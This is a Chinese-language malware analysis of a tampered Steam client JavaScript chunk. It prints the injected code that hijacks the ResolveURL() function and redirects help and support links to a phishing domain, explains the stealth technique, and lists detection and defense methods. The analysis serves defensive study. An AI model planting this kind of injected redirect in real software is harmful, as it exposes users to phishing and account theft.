# JS 注入代码分析 — chunk~2dcc5aaf7.js 篡改

---

## 被篡改文件

| 属性 | 值 |
|------|-----|
| 文件名 | `chunk~2dcc5aaf7.js` |
| 文件大小 | ~14 MB |
| 格式 | Webpack 5 chunk (minified, 单行) |
| 原始来源 | Steam 安装目录 `steamui/` |
| 篡改文件 | `chunk~2dcc5aaf7.js.PATCHED` (桌面副本) |

---

## 注入位置

在 Steam 的 `ResolveURL()` 函数内部:

```javascript
// ===== 原版 Steam 代码 =====
ResolveURL(e,...t){
    const r=this.m_steamUrls[e];
    if(!r)return;
    let i=r.url;

// ===== 病毒注入代码 (~110 字节) =====
    ,_h="https://nexustechsolution.top/steamhelper?d=76561198892973993&a=45f8663926dd7e3b076963037d63a0be85244240",
    _s="https://nexustechsolution.top/steamhelper.html?u=1301664629a&d=76561198892973993&a=45f8663926dd7e3b076963037d63a0be85244240";
    return ({SupportMessages:_s,HelpAppPage:_h,HelpFrontPage:_h})[e]
        ?? (t.length>0&&(i=i.replace(...)), i.startsWith("http://")&&..., i)

// ===== 原版 Steam 代码继续 =====
}
```

---

## 注入机制详解

### 1. 语法嵌入方式

在 `let i=r.url` 语句后插入 `,_h=...,_s=...;`，利用 JavaScript 逗号运算符
将恶意变量声明与原有代码无缝拼接。

### 2. 劫持逻辑

```javascript
return ({SupportMessages:_s, HelpAppPage:_h, HelpFrontPage:_h})[e]
    ?? (原始Steam URL解析逻辑)
```

使用 `??` (nullish coalescing) 运算符：
- 如果 `e` 是 `SupportMessages` → 返回 `_s` (钓鱼 URL)
- 如果 `e` 是 `HelpAppPage` → 返回 `_h` (钓鱼 URL)
- 如果 `e` 是 `HelpFrontPage` → 返回 `_h` (钓鱼 URL)
- 如果 `e` 是其他任何值 → `undefined[anything]` → `undefined` → `??` 走原始逻辑

---

### 3. 被劫持的 URL 键

| Steam URL 键 | 正常值 | 劫持值 |
|-------------|--------|--------|
| `HelpAppPage` | `https://help.steampowered.com/...` | `nexustechsolution.top/steamhelper` |
| `HelpFrontPage` | `https://help.steampowered.com/...` | `nexustechsolution.top/steamhelper` |
| `SupportMessages` | `https://help.steampowered.com/messages` | `nexustechsolution.top/steamhelper.html` |

---

### 4. 静默性分析

| 特性 | 说明 |
|------|------|
| 注入体积极小 | ~110 字节 / 14MB = 0.0008% |
| 仅影响 3 个键 | Steam 其余所有功能完全正常 |
| `??` fallback | 非目标键零影响，无报错 |
| 无新函数声明 | 不创建全局变量，不污染作用域 |

---

## 注入代码特征

```
注入字节数:    ~110 字节
注入位置:      ResolveURL() 函数体内部
检测特征:      const r=this.m_steamUrls[e];if(!r)return;let i=r.url,_h="https://nexustechsolution
C2 出现次数:   2 次 (同一注入块)
字节偏移:      10503057, 10503167
```

---

## 防御检测方法

1. **文件完整性校验** — 对比 chunk JS 的 SHA256 与 Steam 官方版本
2. **静态扫描** — 搜索 `nexustechsolution` 等恶意域名
3. **行为检测** — 监控对 `steamui/` 目录的写入操作
4. **注册表监控** — 检测伪装成 `Steam*` 的 Run 键
5. **steam.cfg 监控** — 检测 `BootStrapperInhibitAll` 非默认值
